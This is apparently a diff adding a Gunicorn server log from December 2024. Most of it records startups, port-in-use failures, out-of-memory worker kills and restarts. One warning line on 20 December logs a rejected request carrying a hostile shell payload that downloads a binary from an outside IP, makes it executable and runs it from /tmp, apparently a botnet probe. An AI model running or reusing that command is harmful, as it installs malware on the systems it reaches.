@@ -1,0 +1,1483 @@
+[2024-12-18 17:21:43 -0300] [44129] [INFO] Starting gunicorn 23.0.0
+[2024-12-18 17:21:43 -0300] [44129] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:21:43 -0300] [44129] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:21:44 -0300] [44129] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:21:44 -0300] [44129] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:21:45 -0300] [44129] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:21:45 -0300] [44129] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:21:46 -0300] [44129] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:21:46 -0300] [44129] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:21:47 -0300] [44129] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:21:47 -0300] [44129] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:21:48 -0300] [44129] [ERROR] Can't connect to ('149.50.146.228', 5792)
+[2024-12-18 17:26:16 -0300] [44172] [INFO] Starting gunicorn 23.0.0
+[2024-12-18 17:26:16 -0300] [44172] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:26:16 -0300] [44172] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:26:17 -0300] [44172] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:26:17 -0300] [44172] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:26:18 -0300] [44172] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:26:18 -0300] [44172] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:26:19 -0300] [44172] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:26:19 -0300] [44172] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:26:20 -0300] [44172] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:26:20 -0300] [44172] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:26:21 -0300] [44172] [ERROR] Can't connect to ('149.50.146.228', 5792)
+[2024-12-18 17:27:00 -0300] [44178] [INFO] Starting gunicorn 23.0.0
+[2024-12-18 17:27:00 -0300] [44178] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:27:00 -0300] [44178] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:27:01 -0300] [44178] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:27:01 -0300] [44178] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:27:02 -0300] [44178] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:27:02 -0300] [44178] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:27:03 -0300] [44178] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:27:03 -0300] [44178] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:27:04 -0300] [44178] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 17:27:04 -0300] [44178] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 17:27:05 -0300] [44178] [ERROR] Can't connect to ('149.50.146.228', 5792)
+[2024-12-18 18:01:51 -0300] [44271] [INFO] Starting gunicorn 23.0.0
+[2024-12-18 18:01:51 -0300] [44271] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 18:01:51 -0300] [44271] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 18:01:52 -0300] [44271] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 18:01:52 -0300] [44271] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 18:01:53 -0300] [44271] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 18:01:53 -0300] [44271] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 18:01:54 -0300] [44271] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 18:01:54 -0300] [44271] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 18:01:55 -0300] [44271] [ERROR] Connection in use: ('149.50.146.228', 5792)
+[2024-12-18 18:01:55 -0300] [44271] [ERROR] connection to ('149.50.146.228', 5792) failed: [Errno 98] Address already in use
+[2024-12-18 18:01:56 -0300] [44271] [ERROR] Can't connect to ('149.50.146.228', 5792)
+[2024-12-18 18:24:38 -0300] [44416] [INFO] Starting gunicorn 23.0.0
+[2024-12-18 18:24:38 -0300] [44416] [INFO] Listening at: http://149.50.146.228:8000 (44416)
+[2024-12-18 18:24:38 -0300] [44416] [INFO] Using worker: sync
+[2024-12-18 18:24:38 -0300] [44417] [INFO] Booting worker with pid: 44417
+[2024-12-18 18:24:39 -0300] [44418] [INFO] Booting worker with pid: 44418
+[2024-12-18 18:24:39 -0300] [44420] [INFO] Booting worker with pid: 44420
+[2024-12-18 18:26:30 -0300] [44416] [ERROR] Worker (pid:44418) was sent SIGKILL! Perhaps out of memory?
+[2024-12-18 18:26:30 -0300] [44416] [INFO] Handling signal: term
+[2024-12-18 18:26:32 -0300] [44420] [INFO] Worker exiting (pid: 44420)
+[2024-12-18 18:26:32 -0300] [44417] [INFO] Worker exiting (pid: 44417)
+[2024-12-18 18:26:35 -0300] [44416] [INFO] Shutting down: Master
+[2024-12-18 18:29:38 -0300] [44451] [INFO] Starting gunicorn 23.0.0
+[2024-12-18 18:29:38 -0300] [44451] [INFO] Listening at: http://149.50.146.228:8000 (44451)
+[2024-12-18 18:29:38 -0300] [44451] [INFO] Using worker: sync
+[2024-12-18 18:29:38 -0300] [44452] [INFO] Booting worker with pid: 44452
+[2024-12-18 18:29:38 -0300] [44453] [INFO] Booting worker with pid: 44453
+[2024-12-18 18:54:40 -0300] [44451] [ERROR] Worker (pid:44453) was sent SIGKILL! Perhaps out of memory?
+[2024-12-18 18:54:40 -0300] [44610] [INFO] Booting worker with pid: 44610
+[2024-12-18 18:54:51 -0300] [44452] [INFO] Worker exiting (pid: 44452)
+[2024-12-18 18:54:51 -0300] [44451] [INFO] Handling signal: term
+[2024-12-18 18:54:51 -0300] [44610] [INFO] Worker exiting (pid: 44610)
+[2024-12-18 18:54:51 -0300] [44451] [ERROR] Worker (pid:44452) was sent SIGTERM!
+[2024-12-18 18:54:52 -0300] [44451] [INFO] Shutting down: Master
+[2024-12-18 18:54:52 -0300] [44616] [INFO] Starting gunicorn 23.0.0
+[2024-12-18 18:54:52 -0300] [44616] [INFO] Listening at: http://149.50.146.228:8000 (44616)
+[2024-12-18 18:54:52 -0300] [44616] [INFO] Using worker: sync
+[2024-12-18 18:54:52 -0300] [44618] [INFO] Booting worker with pid: 44618
+[2024-12-18 18:54:52 -0300] [44619] [INFO] Booting worker with pid: 44619
+[2024-12-18 18:59:54 -0300] [44616] [ERROR] Worker (pid:44618) was sent SIGKILL! Perhaps out of memory?
+[2024-12-18 18:59:54 -0300] [44637] [INFO] Booting worker with pid: 44637
+[2024-12-18 19:00:53 -0300] [44616] [ERROR] Worker (pid:44619) was sent SIGKILL! Perhaps out of memory?
+[2024-12-18 19:00:53 -0300] [44642] [INFO] Booting worker with pid: 44642
+[2024-12-18 19:00:53 -0300] [44616] [INFO] Handling signal: term
+[2024-12-18 19:00:57 -0300] [44637] [INFO] Worker exiting (pid: 44637)
+[2024-12-18 19:01:05 -0300] [44642] [INFO] Worker exiting (pid: 44642)
+[2024-12-18 19:01:05 -0300] [44616] [INFO] Shutting down: Master
+[2024-12-18 19:01:56 -0300] [44658] [INFO] Starting gunicorn 23.0.0
+[2024-12-18 19:01:56 -0300] [44658] [INFO] Listening at: http://149.50.146.228:8000 (44658)
+[2024-12-18 19:01:56 -0300] [44658] [INFO] Using worker: sync
+[2024-12-18 19:01:56 -0300] [44659] [INFO] Booting worker with pid: 44659
+[2024-12-18 19:01:56 -0300] [44660] [INFO] Booting worker with pid: 44660
+[2024-12-18 19:21:33 -0300] [44658] [ERROR] Worker (pid:44659) was sent SIGKILL! Perhaps out of memory?
+[2024-12-18 19:21:33 -0300] [44984] [INFO] Booting worker with pid: 44984
+[2024-12-18 19:22:05 -0300] [44658] [ERROR] Worker (pid:44660) was sent SIGKILL! Perhaps out of memory?
+[2024-12-18 19:22:05 -0300] [44987] [INFO] Booting worker with pid: 44987
+[2024-12-18 19:22:05 -0300] [44658] [INFO] Handling signal: term
+[2024-12-18 19:22:08 -0300] [44984] [INFO] Worker exiting (pid: 44984)
+[2024-12-18 19:22:10 -0300] [44987] [INFO] Worker exiting (pid: 44987)
+[2024-12-18 19:22:10 -0300] [44658] [INFO] Shutting down: Master
+[2024-12-19 16:26:20 -0300] [558] [INFO] Starting gunicorn 23.0.0
+[2024-12-19 16:26:20 -0300] [558] [INFO] Listening at: http://149.50.146.228:8000 (558)
+[2024-12-19 16:26:20 -0300] [558] [INFO] Using worker: sync
+[2024-12-19 16:26:20 -0300] [679] [INFO] Booting worker with pid: 679
+[2024-12-19 16:26:20 -0300] [681] [INFO] Booting worker with pid: 681
+[2024-12-19 17:25:06 -0300] [679] [INFO] Worker exiting (pid: 679)
+[2024-12-19 17:25:06 -0300] [681] [INFO] Worker exiting (pid: 681)
+[2024-12-19 17:25:06 -0300] [558] [INFO] Handling signal: term
+[2024-12-19 17:25:06 -0300] [558] [ERROR] Worker (pid:679) was sent SIGTERM!
+[2024-12-19 17:25:06 -0300] [558] [ERROR] Worker (pid:681) was sent SIGTERM!
+[2024-12-19 17:25:07 -0300] [558] [INFO] Shutting down: Master
+[2024-12-19 17:25:07 -0300] [2198] [INFO] Starting gunicorn 23.0.0
+[2024-12-19 17:25:07 -0300] [2198] [INFO] Listening at: http://127.0.0.1:8000 (2198)
+[2024-12-19 17:25:07 -0300] [2198] [INFO] Using worker: sync
+[2024-12-19 17:25:07 -0300] [2210] [INFO] Booting worker with pid: 2210
+[2024-12-19 17:25:07 -0300] [2211] [INFO] Booting worker with pid: 2211
+[2024-12-19 17:25:12 -0300] [2211] [INFO] Worker exiting (pid: 2211)
+[2024-12-19 17:25:12 -0300] [2198] [INFO] Handling signal: term
+[2024-12-19 17:25:12 -0300] [2210] [INFO] Worker exiting (pid: 2210)
+[2024-12-19 17:25:12 -0300] [2198] [INFO] Shutting down: Master
+[2024-12-19 17:25:12 -0300] [2218] [INFO] Starting gunicorn 23.0.0
+[2024-12-19 17:25:12 -0300] [2218] [INFO] Listening at: http://127.0.0.1:8000 (2218)
+[2024-12-19 17:25:12 -0300] [2218] [INFO] Using worker: sync
+[2024-12-19 17:25:12 -0300] [2219] [INFO] Booting worker with pid: 2219
+[2024-12-19 17:25:12 -0300] [2220] [INFO] Booting worker with pid: 2220
+[2024-12-19 18:07:03 -0300] [2218] [INFO] Handling signal: term
+[2024-12-19 18:07:03 -0300] [2220] [INFO] Worker exiting (pid: 2220)
+[2024-12-19 18:07:03 -0300] [2219] [INFO] Worker exiting (pid: 2219)
+[2024-12-19 18:07:03 -0300] [2218] [ERROR] Worker (pid:2220) was sent SIGTERM!
+[2024-12-19 18:07:03 -0300] [2218] [INFO] Shutting down: Master
+[2024-12-19 18:07:36 -0300] [633] [INFO] Starting gunicorn 23.0.0
+[2024-12-19 18:07:36 -0300] [633] [INFO] Listening at: http://127.0.0.1:8000 (633)
+[2024-12-19 18:07:36 -0300] [633] [INFO] Using worker: sync
+[2024-12-19 18:07:36 -0300] [713] [INFO] Booting worker with pid: 713
+[2024-12-19 18:07:36 -0300] [716] [INFO] Booting worker with pid: 716
+[2024-12-19 21:53:57 -0300] [713] [INFO] Worker exiting (pid: 713)
+[2024-12-19 21:53:57 -0300] [716] [INFO] Worker exiting (pid: 716)
+[2024-12-19 21:53:57 -0300] [633] [INFO] Handling signal: term
+[2024-12-19 21:53:57 -0300] [633] [ERROR] Worker (pid:713) was sent SIGTERM!
+[2024-12-19 21:53:57 -0300] [633] [ERROR] Worker (pid:716) was sent SIGTERM!
+[2024-12-19 21:53:57 -0300] [633] [INFO] Shutting down: Master
+[2024-12-19 21:54:10 -0300] [2509] [INFO] Starting gunicorn 23.0.0
+[2024-12-19 21:54:10 -0300] [2509] [INFO] Listening at: http://127.0.0.1:8000 (2509)
+[2024-12-19 21:54:10 -0300] [2509] [INFO] Using worker: sync
+[2024-12-19 21:54:10 -0300] [2510] [INFO] Booting worker with pid: 2510
+[2024-12-19 21:54:10 -0300] [2511] [INFO] Booting worker with pid: 2511
+[2024-12-19 22:00:36 -0300] [2509] [INFO] Handling signal: hup
+[2024-12-19 22:00:36 -0300] [2509] [INFO] Hang up: Master
+[2024-12-19 22:00:36 -0300] [2509] [INFO] Handling signal: hup
+[2024-12-19 22:00:36 -0300] [2509] [INFO] Hang up: Master
+[2024-12-19 22:00:36 -0300] [2523] [INFO] Booting worker with pid: 2523
+[2024-12-19 22:00:36 -0300] [2522] [INFO] Booting worker with pid: 2522
+[2024-12-19 22:00:36 -0300] [2509] [ERROR] Worker (pid:2510) was sent SIGHUP!
+[2024-12-19 22:00:36 -0300] [2525] [INFO] Booting worker with pid: 2525
+[2024-12-19 22:00:36 -0300] [2524] [INFO] Booting worker with pid: 2524
+[2024-12-19 22:00:36 -0300] [2509] [ERROR] Worker (pid:2511) was sent SIGHUP!
+[2024-12-19 22:00:43 -0300] [2522] [INFO] Worker exiting (pid: 2522)
+[2024-12-19 22:00:43 -0300] [2523] [INFO] Worker exiting (pid: 2523)
+[2024-12-19 22:00:43 -0300] [2509] [ERROR] Worker (pid:2523) was sent SIGTERM!
+[2024-12-19 22:00:43 -0300] [2509] [ERROR] Worker (pid:2522) was sent SIGTERM!
+[2024-12-19 22:07:31 -0300] [2509] [INFO] Handling signal: term
+[2024-12-19 22:07:31 -0300] [2524] [INFO] Worker exiting (pid: 2524)
+[2024-12-19 22:07:31 -0300] [2525] [INFO] Worker exiting (pid: 2525)
+[2024-12-19 22:07:31 -0300] [2509] [ERROR] Worker (pid:2525) was sent SIGTERM!
+[2024-12-19 22:07:31 -0300] [2509] [ERROR] Worker (pid:2524) exited with code 120
+[2024-12-19 22:07:31 -0300] [2509] [ERROR] Worker (pid:2524) exited with code 120.
+[2024-12-19 22:07:31 -0300] [2509] [INFO] Shutting down: Master
+[2024-12-19 22:13:17 -0300] [2719] [INFO] Starting gunicorn 23.0.0
+[2024-12-19 22:13:17 -0300] [2719] [INFO] Listening at: http://0.0.0.0:8000 (2719)
+[2024-12-19 22:13:17 -0300] [2719] [INFO] Using worker: sync
+[2024-12-19 22:13:17 -0300] [2720] [INFO] Booting worker with pid: 2720
+[2024-12-19 22:13:17 -0300] [2721] [INFO] Booting worker with pid: 2721
+[2024-12-19 22:23:28 -0300] [2719] [INFO] Handling signal: winch
+[2024-12-19 22:23:38 -0300] [2719] [INFO] Handling signal: hup
+[2024-12-19 22:23:38 -0300] [2719] [INFO] Hang up: Master
+[2024-12-19 22:23:38 -0300] [2719] [INFO] Handling signal: hup
+[2024-12-19 22:23:38 -0300] [2719] [INFO] Hang up: Master
+[2024-12-19 22:23:38 -0300] [2719] [ERROR] Worker (pid:2721) was sent SIGHUP!
+[2024-12-19 22:23:38 -0300] [2745] [INFO] Booting worker with pid: 2745
+[2024-12-19 22:23:38 -0300] [2744] [INFO] Booting worker with pid: 2744
+[2024-12-19 22:23:38 -0300] [2747] [INFO] Booting worker with pid: 2747
+[2024-12-19 22:23:38 -0300] [2746] [INFO] Booting worker with pid: 2746
+[2024-12-19 22:23:38 -0300] [2719] [ERROR] Worker (pid:2720) was sent SIGHUP!
+[2024-12-19 22:23:45 -0300] [2744] [INFO] Worker exiting (pid: 2744)
+[2024-12-19 22:23:45 -0300] [2745] [INFO] Worker exiting (pid: 2745)
+[2024-12-19 22:23:45 -0300] [2719] [ERROR] Worker (pid:2745) was sent SIGTERM!
+[2024-12-19 22:23:45 -0300] [2719] [ERROR] Worker (pid:2744) was sent SIGTERM!
+[2024-12-19 22:35:06 -0300] [2930] [INFO] Starting gunicorn 23.0.0
+[2024-12-19 22:35:06 -0300] [2930] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:35:06 -0300] [2930] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:35:07 -0300] [2930] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:35:07 -0300] [2930] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:35:08 -0300] [2930] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:35:08 -0300] [2930] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:35:09 -0300] [2930] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:35:09 -0300] [2930] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:35:10 -0300] [2930] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:35:10 -0300] [2930] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:35:11 -0300] [2930] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-19 22:35:36 -0300] [2719] [INFO] Handling signal: term
+[2024-12-19 22:35:36 -0300] [2746] [INFO] Worker exiting (pid: 2746)
+[2024-12-19 22:35:36 -0300] [2747] [INFO] Worker exiting (pid: 2747)
+[2024-12-19 22:35:36 -0300] [2719] [ERROR] Worker (pid:2747) was sent SIGTERM!
+[2024-12-19 22:35:36 -0300] [2719] [ERROR] Worker (pid:2746) exited with code 120
+[2024-12-19 22:35:36 -0300] [2719] [ERROR] Worker (pid:2746) exited with code 120.
+[2024-12-19 22:35:36 -0300] [2719] [INFO] Shutting down: Master
+[2024-12-19 22:35:38 -0300] [2933] [INFO] Starting gunicorn 23.0.0
+[2024-12-19 22:35:38 -0300] [2933] [INFO] Listening at: http://0.0.0.0:8000 (2933)
+[2024-12-19 22:35:38 -0300] [2933] [INFO] Using worker: sync
+[2024-12-19 22:35:38 -0300] [2934] [INFO] Booting worker with pid: 2934
+[2024-12-19 22:35:38 -0300] [2935] [INFO] Booting worker with pid: 2935
+[2024-12-19 22:38:33 -0300] [2933] [INFO] Handling signal: hup
+[2024-12-19 22:38:33 -0300] [2933] [INFO] Hang up: Master
+[2024-12-19 22:38:33 -0300] [2933] [ERROR] Worker (pid:2935) was sent SIGHUP!
+[2024-12-19 22:38:33 -0300] [2943] [INFO] Booting worker with pid: 2943
+[2024-12-19 22:38:33 -0300] [2933] [ERROR] Worker (pid:2934) was sent SIGHUP!
+[2024-12-19 22:38:33 -0300] [2944] [INFO] Booting worker with pid: 2944
+[2024-12-19 22:49:59 -0300] [3057] [INFO] Starting gunicorn 23.0.0
+[2024-12-19 22:49:59 -0300] [3057] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:49:59 -0300] [3057] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:50:00 -0300] [3057] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:50:00 -0300] [3057] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:50:01 -0300] [3057] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:50:01 -0300] [3057] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:50:02 -0300] [3057] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:50:02 -0300] [3057] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:50:03 -0300] [3057] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:50:03 -0300] [3057] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:50:04 -0300] [3057] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-19 22:51:27 -0300] [3138] [INFO] Starting gunicorn 23.0.0
+[2024-12-19 22:51:27 -0300] [3138] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:51:27 -0300] [3138] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:51:28 -0300] [3138] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:51:28 -0300] [3138] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:51:29 -0300] [3138] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:51:29 -0300] [3138] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:51:30 -0300] [3138] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:51:30 -0300] [3138] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:51:31 -0300] [3138] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-19 22:51:31 -0300] [3138] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-19 22:51:32 -0300] [3138] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-19 22:51:37 -0300] [2943] [INFO] Worker exiting (pid: 2943)
+[2024-12-19 22:51:37 -0300] [2944] [INFO] Worker exiting (pid: 2944)
+[2024-12-19 22:51:37 -0300] [2933] [INFO] Handling signal: term
+[2024-12-19 22:51:37 -0300] [2933] [ERROR] Worker (pid:2943) was sent SIGTERM!
+[2024-12-19 22:51:37 -0300] [2933] [ERROR] Worker (pid:2944) was sent SIGTERM!
+[2024-12-19 22:51:37 -0300] [2933] [INFO] Shutting down: Master
+[2024-12-19 22:51:40 -0300] [3140] [INFO] Starting gunicorn 23.0.0
+[2024-12-19 22:51:40 -0300] [3140] [INFO] Listening at: http://0.0.0.0:8000 (3140)
+[2024-12-19 22:51:40 -0300] [3140] [INFO] Using worker: sync
+[2024-12-19 22:51:40 -0300] [3141] [INFO] Booting worker with pid: 3141
+[2024-12-19 22:51:40 -0300] [3142] [INFO] Booting worker with pid: 3142
+[2024-12-19 22:52:26 -0300] [3140] [INFO] Handling signal: hup
+[2024-12-19 22:52:26 -0300] [3140] [INFO] Hang up: Master
+[2024-12-19 22:52:26 -0300] [3146] [INFO] Booting worker with pid: 3146
+[2024-12-19 22:52:26 -0300] [3140] [ERROR] Worker (pid:3142) was sent SIGHUP!
+[2024-12-19 22:52:26 -0300] [3145] [INFO] Booting worker with pid: 3145
+[2024-12-19 22:52:26 -0300] [3140] [ERROR] Worker (pid:3141) was sent SIGHUP!
+[2024-12-20 00:19:25 -0300] [3145] [WARNING] Invalid request from ip=127.0.0.1: Invalid HTTP Version: '192.210.162.147/arm;chmod+777+/tmp/arm;sh+/tmp/arm4 jawsHTTP/1.1 HTTP/1.0'
+[2024-12-20 09:46:04 -0300] [4696] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:46:04 -0300] [4696] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:46:04 -0300] [4696] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:46:05 -0300] [4696] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:46:05 -0300] [4696] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:46:06 -0300] [4696] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:46:06 -0300] [4696] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:46:07 -0300] [4696] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:46:07 -0300] [4696] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:46:08 -0300] [4696] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:46:08 -0300] [4696] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:46:09 -0300] [4696] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:54:50 -0300] [5513] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:54:50 -0300] [5513] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:54:50 -0300] [5513] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:54:51 -0300] [5513] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:54:51 -0300] [5513] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:54:52 -0300] [5513] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:54:52 -0300] [5513] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:54:53 -0300] [5513] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:54:53 -0300] [5513] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:54:54 -0300] [5513] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:54:54 -0300] [5513] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:54:55 -0300] [5513] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:54:55 -0300] [5514] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:54:55 -0300] [5514] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:54:55 -0300] [5514] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:54:56 -0300] [5514] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:54:56 -0300] [5514] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:54:57 -0300] [5514] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:54:57 -0300] [5514] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:54:58 -0300] [5514] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:54:58 -0300] [5514] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:54:59 -0300] [5514] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:54:59 -0300] [5514] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:00 -0300] [5514] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:55:00 -0300] [5515] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:55:00 -0300] [5515] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:00 -0300] [5515] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:01 -0300] [5515] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:01 -0300] [5515] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:02 -0300] [5515] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:02 -0300] [5515] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:03 -0300] [5515] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:03 -0300] [5515] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:04 -0300] [5515] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:04 -0300] [5515] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:05 -0300] [5515] [ERROR] Can't connect to ('0.0.0.0', 8000)
+[2024-12-20 09:55:05 -0300] [5518] [INFO] Starting gunicorn 23.0.0
+[2024-12-20 09:55:05 -0300] [5518] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:05 -0300] [5518] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:06 -0300] [5518] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:06 -0300] [5518] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
+[2024-12-20 09:55:07 -0300] [5518] [ERROR] Connection in use: ('0.0.0.0', 8000)
+[2024-12-20 09:55:07 -0300] [5518] [ERROR] connection to ('0.0.0.0', 8000) failed: [Errno 98] Address already in use
